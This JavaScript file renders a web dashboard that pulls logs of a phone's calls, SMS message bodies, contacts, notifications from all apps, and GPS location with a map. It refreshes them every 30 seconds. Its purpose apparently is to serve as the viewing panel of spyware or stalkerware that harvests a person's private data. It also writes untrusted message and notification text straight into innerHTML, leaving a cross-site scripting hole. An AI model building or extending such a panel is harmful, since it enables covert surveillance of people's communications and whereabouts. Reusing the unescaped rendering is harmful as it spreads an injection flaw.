let refreshInterval = null; 
let currentLog = null;

function loadToBoard(url, file) {
  currentLog = url.substring(0, url.lastIndexOf("/"));;
  const spinner = document.querySelector(".spinner-container");
  const board = document.getElementById("board-content");

  if (refreshInterval) {
    clearInterval(refreshInterval);
    refreshInterval = null;
  }

  function fetchAndRender() {
    spinner.style.display = "flex";
    board.innerHTML = `<p>⏳ Loading <strong>${file}</strong>...</p>`;

    fetch(url)
      .then(res => res.json())
      .then(data => {
        board.innerHTML = ""; // reset

        let rendered = false;

        // --- Calls ---
        if (Array.isArray(data.calls)) {
          rendered = true;
          if (data.calls.length === 0) {
            board.innerHTML += "<p>No calls found in this log.</p>";
          } else {
            data.calls.forEach(call => {
              const div = document.createElement("div");
              div.className = "call-entry";
              div.innerHTML = `
                <p><strong>📞 Number:</strong> ${call.number}</p>
                <p><strong>👤 Name:</strong> ${call.name || "Unknown"}</p>
                <p><strong>⏱ Duration:</strong> ${call.duration} sec</p>
                <p><strong>📅 Date:</strong> ${new Date(call.date).toLocaleString()}</p>
                <p><strong>📌 Type:</strong> ${call.type}</p>
                <hr>
              `;
              board.appendChild(div);
            });
          }
        }

        // --- SMS ---
        if (Array.isArray(data.sms)) {
          rendered = true;
          if (data.sms.length === 0) {
            board.innerHTML += "<p>No SMS messages found.</p>";
          } else {
            data.sms.forEach(msg => {
              const div = document.createElement("div");
              div.className = "sms-entry";
              div.innerHTML = `
                <p><strong>👤 Address:</strong> ${msg.address || "Unknown"}</p>
                <p><strong>💬 Body:</strong> ${msg.body}</p>
                <p><strong>📅 Date:</strong> ${new Date(msg.date).toLocaleString()}</p>
                <p><strong>📌 Type:</strong> ${msg.type}</p>
                <hr>
              `;
              board.appendChild(div);
            });
          }
        }

        // --- Contacts ---
        if (Array.isArray(data.contacts)) {
          rendered = true;
          if (data.contacts.length === 0) {
            board.innerHTML += "<p>No contacts found.</p>";
          } else {
            data.contacts.forEach(contact => {
              const div = document.createElement("div");
              const phones = contact.phones.join(", ");
              const emails = contact.emails.join(", ");
              div.className = "contact-entry";
              div.innerHTML = `
                <p><strong>👤 Name:</strong> ${contact.displayName}</p>
                <p><strong>📞 Number:</strong> ${phones}</p>
                <p><strong>📧 Email:</strong> ${emails || "N/A"}</p>
                <hr>
              `;
              board.appendChild(div);
            });
          }
        }

        // --- Notifications ---
        if (Array.isArray(data.notifications)) {
          rendered = true;
          if (data.notifications.length === 0) {
            board.innerHTML += "<p>No notifications found.</p>";
          } else {
            // reverse the array so newest is first
            data.notifications.slice().reverse().forEach(notif => {
              const div = document.createElement("div");
              div.className = "notification-entry";
              div.innerHTML = `
                <p><strong>📦 Package:</strong> ${notif.package}</p>
                <p><strong>💬 Title:</strong> ${notif.title || "(no title)"}</p>
                <p><strong>📝 Text:</strong> ${notif.text || "(empty)"}</p>
                <p><strong>⏱ Timestamp:</strong> ${new Date(notif.timestamp).toLocaleString()}</p>
                <hr>
              `;
              board.appendChild(div);
            });
          }
        }

        // --- Location ---
        if (data.location) {
          rendered = true;
          const loc = data.location;
          if (!loc.latitude || !loc.longitude) {
            board.innerHTML += "<p>No location data found.</p>";
          } else {
            const div = document.createElement("div");
            div.className = "location-entry";
            div.innerHTML = `
              <p><strong>📍 Latitude:</strong> ${loc.latitude}</p>
              <p><strong>📍 Longitude:</strong> ${loc.longitude}</p>
              <p><strong>📅 Date:</strong> ${new Date(loc.date).toLocaleString()}</p>
              <div id="map" style="width:100%; height:300px; margin:10px 0; border-radius:12px;"></div>
            `;
            board.appendChild(div);

            setTimeout(() => {
              const map = L.map("map").setView(
                [parseFloat(loc.latitude), parseFloat(loc.longitude)],
                15
              );
              L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
                attribution: "&copy; OpenStreetMap contributors"
              }).addTo(map);
              L.marker([parseFloat(loc.latitude), parseFloat(loc.longitude)])
                .addTo(map)
                .bindPopup(`<b>Logged at:</b><br>${new Date(loc.date).toLocaleString()}`)
                .openPopup();
            }, 200);
          }
        }

        // If nothing matched, show unknown
        if (!rendered) {
          board.innerHTML = "<p>❓ Unrecognized log format.</p>";
        }

        spinner.style.display = "none";
      })
      .catch(err => {
        console.error("Error loading log:", err);
        board.innerHTML = "<p>⚠️ Failed to load log.</p>";
        spinner.style.display = "none";
      });
  }
  fetchAndRender();
  refreshInterval = setInterval(fetchAndRender, 30000);
}

function filterNotifications(packageName) {
  const spinner = document.querySelector(".spinner-container");
  const board = document.getElementById("board-content");

  spinner.style.display = "flex";
  board.innerHTML = `<p>⏳ Loading notifications for <strong>${packageName}</strong>...</p>`;
  function fetchAndRender() {
    fetch(`${currentLog}/notifications.json`)
    .then(res => res.json())
    .then(data => {
      board.innerHTML = "";
      const notifs = data.notifications || [];

      const filtered = notifs.filter(n => n.package === packageName);

      if (filtered.length === 0) {
        board.innerHTML = `<p>❌ No notifications found for ${packageName}.</p>`;
        spinner.style.display = "none";
        return;
      }

      filtered.reverse().forEach(n => {
        const div = document.createElement("div");
        div.className = "notif-entry";
        div.style.borderBottom = "1px solid #ddd";
        div.style.padding = "8px 0";
        div.innerHTML = `
          <p><strong>📦 Package:</strong> ${n.package}</p>
          <p><strong>🔔 Title:</strong> ${n.title}</p>
          <p><strong>💬 Text:</strong> ${n.text}</p>
          <p><strong>🕒 Time:</strong> ${new Date(n.timestamp).toLocaleString()}</p>
        `;
        board.appendChild(div);
      });

      spinner.style.display = "none";
    })
    .catch(err => {
      console.error("Error loading filtered notifications:", err);
      board.innerHTML = "<p>⚠️ Failed to load notifications.</p>";
      spinner.style.display = "none";
    });
  }
  fetchAndRender();
  clearInterval(refreshInterval);
  refreshInterval = setInterval(fetchAndRender, 30000);
}

